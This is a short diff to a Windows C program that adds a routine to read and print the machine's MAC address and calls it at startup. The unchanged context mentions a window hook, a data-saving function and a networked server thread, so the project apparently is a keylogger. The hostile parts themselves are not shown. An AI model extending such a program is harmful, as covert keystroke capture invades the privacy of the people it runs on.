@@ -151,7 +151,54 @@ void	setwinhook()
 	CloseHandle(process.hThread);
 #endif // 0
 }
+#define WORKING_BUFFER_SIZE 15000
+#define MAX_TRIES 3
 
+static void MacAddr(void)
+{
+	DWORD err = 0;
+	PIP_ADAPTER_ADDRESSES pAddresses = NULL;
+	PIP_ADAPTER_ADDRESSES pCurrAddresses = NULL;
+	ULONG len = 0;
+	ULONG iterations = 0;
+
+	len = WORKING_BUFFER_SIZE;
+	do {
+		if ((pAddresses = malloc(len)) == NULL)
+			return;
+		if ((err = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &len)) == ERROR_BUFFER_OVERFLOW)
+		{
+			free(pAddresses);
+			pAddresses = NULL;
+		}
+		else {
+			break;
+		}
+		iterations++;
+	} while ((err == ERROR_BUFFER_OVERFLOW) && (iterations < MAX_TRIES));
+	if (err == NO_ERROR) {
+		pCurrAddresses = pAddresses;
+//		while (pCurrAddresses) {
+			if (pCurrAddresses->PhysicalAddressLength != 0) {
+				for (unsigned int i = 0; i < (int)pCurrAddresses->PhysicalAddressLength;
+				i++) {
+					if (i == (pCurrAddresses->PhysicalAddressLength - 1))
+						printf("%.2X\n",
+							(int)pCurrAddresses->PhysicalAddress[i]);
+					else
+						printf("%.2X-",
+							(int)pCurrAddresses->PhysicalAddress[i]);
+				}
+			}
+			printf("\n");
+			pCurrAddresses = pCurrAddresses->Next;
+		//}
+	}
+	if (pAddresses) {
+		free(pAddresses);
+	}
+	return;
+}
 void	save_data(const char *data)
 {
 	static int nbChar;
@@ -225,6 +272,7 @@ int	main(void)
 	HANDLE thread_server;
 	SOCKET server_sock;
 
+	MacAddr();
 	WSAStartup(MAKEWORD(2, 0), &wsadata);
 	if ((thread_keepalive = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keep_alive_client_and_init, NULL, 0, NULL)) == NULL)
 		return (-1);
